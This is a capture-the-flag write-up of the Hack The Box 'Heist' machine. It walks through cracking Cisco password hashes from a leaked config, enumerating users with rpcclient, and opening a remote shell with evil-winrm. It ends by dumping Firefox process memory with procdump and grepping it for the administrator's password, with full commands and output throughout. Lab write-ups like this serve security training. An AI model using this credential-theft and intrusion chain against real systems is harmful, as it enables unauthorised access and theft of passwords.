---
title: "HTB - Heist"
permalink: /Heist_HTB/
layout: single
author-profile: true
---

##Scanning
### Nmap

```PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-01T08:47:31
|_  start_date: N/A
```
## Enumeration

First i opened the webpage to have a look arround.
Theres a guest login which shows an old support chat.

This has a config file and a possible username of Hazard.

### Support Log:
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
 ```
 
 This file contails two cisco passwords which we can crack.
 
 #### Type 5
 ```
 john -w=/home/kali/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:20 DONE (2022-06-01 06:01) 0.04889g/s 171410p/s 171410c/s 171410C/s stealthy001..steak7893
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Type 7
```
┌──(kali㉿kali)-[~]
└─$ python3 type7.py 0242114B0E143F015F5D1E161713
$uperP@ssword
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 type7.py 02375012182C1A1D751618034F36415408
Q4)sJu\Y8qz*A3?d
```

## Exploitation 
since smbclient couldnt connect to the server with valid credentials, I connected to the IPC share using rpcclient.
```
┌──(kali㉿kali)-[~]
└─$ rpcclient -U 'hazard%stealth1agent' 10.10.10.149
rpcclient $> ls
```
I then looked up names and hazards SID, with the end number being 1008 it suggests there are more user SIDs around this number.
```
rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
```
This found 4 users on the system
```
┌──(kali㉿kali)-[~]
└─$ for i in {1000..1050}; do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
```

after trying to connect with evil-winrm using all combinations of the new usernames and passwords I found earlier, I got a shell with chase.

```┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.10.149 -u Chase                    
Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> 
```
This gave me the user flag.
```
*Evil-WinRM* PS C:\Users\Chase\Desktop> cat user.txt
1eb2c624432b4431aa66fcdf********
```
## PrivEsc

after looking around there wasn't much except from the todo.txt file

The only thing of relevance was reference to checking the issue list. Since there was no list on the server, which chase could access, this must be donw by a browser.

After using `Get-Process` command to find out what browser he usually uses, i found firefox was running.
```
*Evil-WinRM* PS C:\> get-process firefox
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    358      26    16332     279920       0.73   6252   1 firefox
   1138      71   141448     476008      42.98   6440   1 firefox
    341      19    10176     264104       0.80   6564   1 firefox
    407      31    17392     293212       3.86   6796   1 firefox
    390      36    78456     341504      67.70   7104   1 firefox  
```

Navigating to his profile page shows a cached profile. using the sessionstore-backups directory it is possible to retreive credentials.

``*Evil-WinRM* PS C:\Users\Chase\AppData\roaming\Mozilla\Firefox\Profiles\77nc64t5.default\sessionstore-backups> Get-ChildItem -path . -recurse -file | select-string password``

However since the machine was reset there was no data in here. The next method is to use procdump from sysinternals.
```
*Evil-WinRM* PS C:\Users\Chase\AppData\roaming\Mozilla\Firefox\Profiles\77nc64t5.default\sessionstore-backups> upload procdump64.exe
Info: Uploading procdump64.exe to C:\Users\Chase\AppData\roaming\Mozilla\Firefox\Profiles\77nc64t5.default\sessionstore-backups\procdump64.exe

                                                             
Data: 535060 bytes of 535060 bytes copied

Info: Upload successful!
```
```
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6076 -accepteula

ProcDump v10.11 - Sysinternals process dump utility
Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[16:39:09] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_220601_163909.dmp
[16:39:09] Dump 1 writing: Estimated dump file size is 307 MB.
[16:39:11] Dump 1 complete: 307 MB written in 1.1 seconds
[16:39:11] Dump count reached.
```
after downloading the dump I can use a grep commmand to find the login information.
```
$ grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_220601_164733.dmp 
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```
Now I can use Evil-winrm to login as administrator

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.10.149 -u SUPPORTDESK\\administrator -s . -e . -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ea7f3d28835999e15692900d********
```






